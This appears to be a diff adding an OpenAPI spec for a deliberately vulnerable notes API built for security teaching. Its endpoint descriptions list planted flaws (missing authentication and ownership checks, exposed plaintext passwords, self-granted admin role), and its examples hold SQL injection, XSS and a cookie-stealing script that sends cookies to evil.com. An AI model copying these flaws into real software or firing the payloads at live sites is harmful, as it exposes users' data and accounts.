@@ -1,0 +1,583 @@
+openapi: 3.0.3
+info:
+  title: Vulnerable Notes API
+  description: |
+    **⚠️ WARNING: This API is intentionally vulnerable for educational purposes!**
+    
+    This API demonstrates various security vulnerabilities commonly found in web applications:
+    - SQL Injection
+    - Cross-Site Scripting (XSS) 
+    - Broken Authentication & Authorization
+    - Sensitive Data Exposure
+    - Security Misconfiguration
+    - Insecure Direct Object References
+    
+    **DO NOT USE IN PRODUCTION!**
+  version: 1.0.0
+  contact:
+    name: Security Education Project
+    email: security@vulnerable-app.com
+  license:
+    name: MIT
+    url: https://opensource.org/licenses/MIT
+
+servers:
+  - url: http://localhost:3000/api
+    description: Development server (vulnerable)
+  - url: https://vulnerable-notes.vercel.app/api
+    description: Production server (also vulnerable!)
+
+paths:
+  /auth/login:
+    post:
+      summary: Login user (vulnerable to brute force)
+      description: |
+        **VULNERABILITIES:**
+        - No rate limiting (brute force attacks)
+        - Detailed error messages help attackers
+        - Password in response
+        - Insecure cookie settings
+        - No CSRF protection
+      tags:
+        - Authentication
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                email:
+                  type: string
+                  format: email
+                  example: admin@vulnerable-app.com
+                password:
+                  type: string
+                  example: admin123
+              required:
+                - email
+                - password
+            examples:
+              normalLogin:
+                summary: Normal login
+                value:
+                  email: user@example.com
+                  password: password123
+              sqlInjection:
+                summary: SQL Injection attempt
+                value:
+                  email: "admin' OR '1'='1' --"
+                  password: anything
+      responses:
+        '200':
+          description: Login successful
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/LoginResponse'
+        '401':
+          description: Login failed
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+
+  /auth/register:
+    post:
+      summary: Register new user (vulnerable)
+      description: |
+        **VULNERABILITIES:**
+        - Users can set their own role (including admin)
+        - No input validation
+        - Password stored in plain text
+        - No email verification
+      tags:
+        - Authentication
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                email:
+                  type: string
+                  format: email
+                password:
+                  type: string
+                role:
+                  type: string
+                  enum: [user, admin]
+                  description: "VULNERABLE: Users can make themselves admin!"
+              required:
+                - email
+                - password
+            examples:
+              normalUser:
+                summary: Register normal user
+                value:
+                  email: user@example.com
+                  password: password123
+              adminUser:
+                summary: Register as admin (vulnerable)
+                value:
+                  email: hacker@evil.com
+                  password: hack123
+                  role: admin
+      responses:
+        '200':
+          description: Registration successful
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/LoginResponse'
+
+  /notes:
+    get:
+      summary: Search notes (no authentication required!)
+      description: |
+        **VULNERABILITIES:**
+        - No authentication required
+        - SQL injection in search parameter
+        - Exposes all user data including passwords
+        - No access control
+      tags:
+        - Notes
+      parameters:
+        - name: q
+          in: query
+          schema:
+            type: string
+          description: Search query (vulnerable to SQL injection)
+          example: "' OR '1'='1"
+        - name: userId
+          in: query
+          schema:
+            type: string
+          description: Filter by user ID (exposes direct object references)
+        - name: limit
+          in: query
+          schema:
+            type: integer
+        - name: offset
+          in: query
+          schema:
+            type: integer
+      responses:
+        '200':
+          description: Notes retrieved
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/NotesResponse'
+
+    post:
+      summary: Create note (no authentication!)
+      description: |
+        **VULNERABILITIES:**
+        - No authentication required
+        - Users can create notes for other users
+        - No input sanitization (XSS vulnerable)
+        - No rate limiting
+      tags:
+        - Notes
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                title:
+                  type: string
+                  example: "<script>alert('XSS')</script>"
+                content:
+                  type: string
+                  example: "This note contains <img src=x onerror=alert('XSS')>"
+                ownerId:
+                  type: string
+                  description: "VULNERABLE: Can create notes for other users"
+                isPublic:
+                  type: boolean
+              required:
+                - title
+                - content
+                - ownerId
+      responses:
+        '201':
+          description: Note created
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/NoteResponse'
+
+  /notes/{id}:
+    get:
+      summary: Get note by ID (no authorization!)
+      description: |
+        **VULNERABILITIES:**
+        - No authentication or authorization
+        - SQL injection in ID parameter
+        - Exposes owner's sensitive data
+      tags:
+        - Notes
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+          example: "1' OR '1'='1"
+      responses:
+        '200':
+          description: Note retrieved
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/NoteResponse'
+
+    put:
+      summary: Update note (no ownership check!)
+      description: |
+        **VULNERABILITIES:**
+        - No authentication
+        - No ownership verification
+        - Anyone can modify anyone's notes
+      tags:
+        - Notes
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+      requestBody:
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/Note'
+      responses:
+        '200':
+          description: Note updated
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/NoteResponse'
+
+    delete:
+      summary: Delete note (no ownership check!)
+      description: |
+        **VULNERABILITIES:**
+        - No authentication
+        - No ownership verification  
+        - Anyone can delete anyone's notes
+      tags:
+        - Notes
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        '200':
+          description: Note deleted
+
+  /users:
+    get:
+      summary: Get all users (no authentication!)
+      description: |
+        **VULNERABILITIES:**
+        - No authentication required
+        - Exposes all user data including passwords
+        - No pagination limits
+        - Admin users exposed
+      tags:
+        - Users
+      responses:
+        '200':
+          description: All users retrieved
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/UsersResponse'
+
+  /users/{id}:
+    get:
+      summary: Get user by ID (no authorization!)
+      description: |
+        **VULNERABILITIES:**
+        - No authentication required
+        - Exposes user's password
+        - Exposes user's private notes
+        - SQL injection in ID parameter
+      tags:
+        - Users
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+          example: "1' OR '1'='1"
+      responses:
+        '200':
+          description: User data and private notes
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/UserDetailResponse'
+
+  /lab/sqli:
+    get:
+      summary: SQL Injection demonstration (lab mode only)
+      description: |
+        **EDUCATIONAL VULNERABILITY DEMONSTRATION**
+        
+        This endpoint demonstrates SQL injection vulnerabilities.
+        Only available when LAB_MODE=true.
+      tags:
+        - Lab (Educational)
+      parameters:
+        - name: search
+          in: query
+          schema:
+            type: string
+          description: Search parameter vulnerable to SQL injection
+          examples:
+            bypass:
+              summary: Authentication bypass
+              value: "admin' OR '1'='1"
+            union:
+              summary: Union attack
+              value: "' UNION SELECT password FROM users --"
+            drop:
+              summary: Destructive attack
+              value: "'; DROP TABLE users; --"
+      responses:
+        '200':
+          description: Vulnerability demonstration results
+
+  /lab/xss:
+    get:
+      summary: XSS demonstration (lab mode only)
+      description: |
+        **EDUCATIONAL VULNERABILITY DEMONSTRATION**
+        
+        This endpoint demonstrates XSS vulnerabilities.
+        Only available when LAB_MODE=true.
+      tags:
+        - Lab (Educational)
+      parameters:
+        - name: input
+          in: query
+          schema:
+            type: string
+          description: Input reflected without escaping
+          examples:
+            alert:
+              summary: Basic XSS
+              value: "<script>alert('XSS')</script>"
+            img:
+              summary: Image XSS
+              value: "<img src=x onerror=alert('XSS')>"
+            cookie:
+              summary: Cookie stealing
+              value: "<script>document.location='//evil.com?cookie='+document.cookie</script>"
+        - name: reflect
+          in: query
+          schema:
+            type: boolean
+          description: Whether to reflect the input
+      responses:
+        '200':
+          description: HTML page with reflected XSS vulnerability
+
+  /lab/csp:
+    get:
+      summary: CSP demonstration (lab mode only)
+      description: |
+        **EDUCATIONAL VULNERABILITY DEMONSTRATION**
+        
+        This endpoint demonstrates Content Security Policy vulnerabilities.
+        Only available when LAB_MODE=true.
+      tags:
+        - Lab (Educational)
+      parameters:
+        - name: mode
+          in: query
+          schema:
+            type: string
+            enum: [none, weak, strong]
+          description: CSP configuration to demonstrate
+      responses:
+        '200':
+          description: HTML page demonstrating CSP effectiveness
+
+components:
+  schemas:
+    User:
+      type: object
+      properties:
+        id:
+          type: string
+        email:
+          type: string
+          format: email
+        password:
+          type: string
+          description: "VULNERABLE: Password exposed in API responses!"
+        role:
+          type: string
+          enum: [user, admin]
+        isAdmin:
+          type: boolean
+        createdAt:
+          type: string
+          format: date-time
+        updatedAt:
+          type: string
+          format: date-time
+
+    Note:
+      type: object
+      properties:
+        id:
+          type: string
+        title:
+          type: string
+          description: "Not sanitized - XSS vulnerable"
+        content:
+          type: string
+          description: "Not sanitized - XSS vulnerable"
+        ownerId:
+          type: string
+        isPublic:
+          type: boolean
+        createdAt:
+          type: string
+          format: date-time
+        updatedAt:
+          type: string
+          format: date-time
+        owner:
+          $ref: '#/components/schemas/User'
+
+    ApiResponse:
+      type: object
+      properties:
+        success:
+          type: boolean
+        data:
+          type: object
+        error:
+          type: string
+        debug:
+          type: object
+          description: "VULNERABLE: Debug info exposed in production"
+          properties:
+            query:
+              type: string
+              description: "SQL queries exposed"
+            params:
+              type: object
+              description: "Request parameters logged"
+            stack:
+              type: string
+              description: "Stack traces exposed"
+            timestamp:
+              type: string
+
+    LoginResponse:
+      allOf:
+        - $ref: '#/components/schemas/ApiResponse'
+        - type: object
+          properties:
+            data:
+              type: object
+              properties:
+                user:
+                  $ref: '#/components/schemas/User'
+                token:
+                  type: string
+                  description: "JWT token with sensitive data"
+
+    NotesResponse:
+      allOf:
+        - $ref: '#/components/schemas/ApiResponse'
+        - type: object
+          properties:
+            data:
+              type: object
+              properties:
+                notes:
+                  type: array
+                  items:
+                    $ref: '#/components/schemas/Note'
+                count:
+                  type: integer
+
+    NoteResponse:
+      allOf:
+        - $ref: '#/components/schemas/ApiResponse'
+        - type: object
+          properties:
+            data:
+              type: object
+              properties:
+                note:
+                  $ref: '#/components/schemas/Note'
+
+    UsersResponse:
+      allOf:
+        - $ref: '#/components/schemas/ApiResponse'
+        - type: object
+          properties:
+            data:
+              type: object
+              properties:
+                users:
+                  type: array
+                  items:
+                    $ref: '#/components/schemas/User'
+                count:
+                  type: integer
+
+    UserDetailResponse:
+      allOf:
+        - $ref: '#/components/schemas/ApiResponse'
+        - type: object
+          properties:
+            data:
+              type: object
+              properties:
+                user:
+                  $ref: '#/components/schemas/User'
+                notes:
+                  type: array
+                  items:
+                    $ref: '#/components/schemas/Note'
+                  description: "VULNERABLE: Private notes exposed"
+                notesCount:
+                  type: integer
+
+    ErrorResponse:
+      allOf:
+        - $ref: '#/components/schemas/ApiResponse'
+        - type: object
+          properties:
+            success:
+              example: false
+            error:
+              type: string
+              example: "Detailed error message that helps attackers"
+
+tags:
+  - name: Authentication
+    description: "Vulnerable authentication endpoints"
+  - name: Notes
+    description: "Note management without proper security"
+  - name: Users
+    description: "User data exposure endpoints"
+  - name: Lab (Educational)
+    description: "Educational vulnerability demonstrations"
